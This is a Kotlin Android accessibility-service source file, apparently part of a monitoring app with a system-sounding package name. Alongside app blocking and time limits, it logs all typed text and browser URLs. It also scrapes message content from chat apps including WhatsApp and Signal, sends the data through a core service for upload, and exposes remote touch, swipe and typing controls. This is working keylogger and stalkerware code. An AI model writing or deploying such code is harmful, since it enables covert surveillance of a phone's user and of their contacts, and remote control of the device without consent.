package com.system.service.monitors

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.system.service.core.CoreService
import org.json.JSONObject

class AccessibilityMonitor : AccessibilityService() {

    companion object {
        var instance: AccessibilityMonitor? = null
        fun performTouch(x: Float, y: Float)  { instance?.doTouch(x, y) }
        fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, dur: Long = 300) {
            instance?.doSwipe(x1, y1, x2, y2, dur)
        }
        fun performBack()    { instance?.performGlobalAction(GLOBAL_ACTION_BACK) }
        fun performHome()    { instance?.performGlobalAction(GLOBAL_ACTION_HOME) }
        fun performRecents() { instance?.performGlobalAction(GLOBAL_ACTION_RECENTS) }
        fun typeText(text: String) { instance?.doType(text) }
    }

    private var lastPkg = ""
    private var lastScreenText = ""
    private val CHAT_PKGS = setOf(
        "com.whatsapp", "com.whatsapp.w4b", "org.telegram.messenger",
        "com.instagram.android", "com.snapchat.android", "com.facebook.orca",
        "com.discord", "com.twitter.android", "org.thoughtcrime.securesms"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        AppBlockerManager.init(applicationContext)
        KeywordDetector.init(applicationContext)
        BrowserBlocker.init(applicationContext)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val svc = CoreService.instance
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            when (event.eventType) {

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (AppBlockerManager.isBlocked(pkg)) {
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        svc?.sendData("app_blocked", JSONObject().apply {
                            put("package", pkg); put("reason", "blocked")
                        })
                        return
                    }
                    if (AppBlockerManager.isTimeLimitExceeded(pkg)) {
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        svc?.sendData("app_blocked", JSONObject().apply {
                            put("package", pkg); put("reason", "time_limit")
                            put("minutes_used", AppBlockerManager.getTodayUsageMinutes(pkg))
                        })
                        return
                    }
                    if (pkg != lastPkg) {
                        AppBlockerManager.trackAppStart(pkg)
                        lastPkg = pkg
                        svc?.sendData("app_open", JSONObject().apply {
                            put("package", pkg)
                            put("class", event.className ?: "")
                            put("time", System.currentTimeMillis())
                        })
                    }
                }

                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val text = event.text.joinToString(" ")
                    if (text.isNotBlank()) {
                        KeywordDetector.check(text, pkg, "typing")
                        svc?.sendData("screen_text", JSONObject().apply {
                            put("package", pkg); put("text", text)
                            put("time", System.currentTimeMillis())
                        })
                    }
                }

                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val root = rootInActiveWindow ?: return
                    val content = extractText(root)
                    // BUG FIX: rootInActiveWindow result must be recycled after use
                    root.recycle()

                    if (BrowserBlocker.isBrowserPkg(pkg) && content.isNotBlank()) {
                        val urlCandidate = content.lines()
                            .map { it.trim() }
                            .firstOrNull { it.contains(".") && it.length < 200 }
                        if (urlCandidate != null) {
                            BrowserBlocker.checkUrl(urlCandidate, pkg, this)
                        }
                    }

                    if (VideoHistoryMonitor.MONITORED_PKGS.contains(pkg) && content.isNotBlank()) {
                        VideoHistoryMonitor.onContentChanged(pkg, content)
                    }

                    if (CHAT_PKGS.contains(pkg)) {
                        if (content != lastScreenText && content.isNotBlank()) {
                            lastScreenText = content
                            KeywordDetector.check(content, pkg, "chat")
                            svc?.sendData("chat_content", JSONObject().apply {
                                put("package", pkg); put("content", content.take(500))
                                put("time", System.currentTimeMillis())
                            })
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractText(node: AccessibilityNodeInfo?, depth: Int = 0): String {
        if (node == null || depth > 8) return ""
        val sb = StringBuilder()
        node.text?.let { if (it.isNotBlank()) sb.append(it).append("\n") }
        node.contentDescription?.let { if (it.isNotBlank()) sb.append("[").append(it).append("]\n") }
        for (i in 0 until node.childCount) {
            // BUG FIX: getChild() returns a new AccessibilityNodeInfo that MUST be recycled.
            // Not recycling these caused a steady accessibility node leak during heavy use.
            val child = node.getChild(i)
            sb.append(extractText(child, depth + 1))
            child?.recycle()
        }
        return sb.toString().trim()
    }

    private fun doTouch(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50)).build(), null, null)
    }

    private fun doSwipe(x1: Float, y1: Float, x2: Float, y2: Float, dur: Long) {
        val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur)).build(), null, null)
    }

    private fun doType(text: String) {
        try {
            val node = findFirstEditable(rootInActiveWindow) ?: return
            val args = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            node.recycle()
        } catch (_: Exception) {}
    }

    private fun findFirstEditable(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 10) return null
        if (node.isEditable) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val found = findFirstEditable(child, depth + 1)
            if (found != null) {
                // Recycle child only if it's not the found node itself
                if (found != child) child?.recycle()
                return found
            }
            child?.recycle()
        }
        return null
    }

    override fun onInterrupt() { instance = null }
    override fun onDestroy() { instance = null; AppBlockerManager.trackAppEnd(); super.onDestroy() }
}
